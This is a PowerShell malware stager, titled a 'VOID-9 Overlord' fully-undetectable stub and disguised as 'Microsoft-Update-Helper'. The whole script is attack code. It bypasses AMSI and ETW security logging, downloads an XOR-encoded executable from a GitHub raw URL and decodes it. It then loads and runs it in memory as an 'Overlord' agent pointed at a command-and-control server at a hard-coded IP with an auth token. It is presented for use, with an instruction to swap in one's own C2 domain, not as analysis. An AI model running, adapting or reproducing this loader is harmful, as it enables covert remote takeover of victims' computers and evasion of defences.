# VOID-9 Overlord GitHub FUD Stub 2026 - Microsoft-Update-Helper edition
$ErrorActionPreference = 'SilentlyContinue'

# AMSI + ETW bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

# === CHANGE ONLY THE c2url IF YOUR DOMAIN IS DIFFERENT ===
$githubUser = "s7xeyes"
$githubRepo = "Microsoft-Update-Helper"
$c2url      = "http://176.65.132.236:5173"   # ←←← CHANGE THIS TO YOUR REAL DOMAIN
$token      = "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ"

# Download the stub
$url = "https://raw.githubusercontent.com/$githubUser/$githubRepo/main/winverify.exe"

$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$data = $wc.DownloadData($url)

# XOR decrypt
for($i=0; $i -lt $data.Length; $i++) {
    $data[$i] = $data[$i] -bxor 0x69
}

# Run Overlord agent in memory
$asm = [System.Reflection.Assembly]::Load($data)
$type = $asm.GetType("Overlord.Agent")
$method = $type.GetMethod("Run", [Reflection.BindingFlags]"Public,Static")
$method.Invoke($null, @($c2url, $token))

# VOID-9 virus
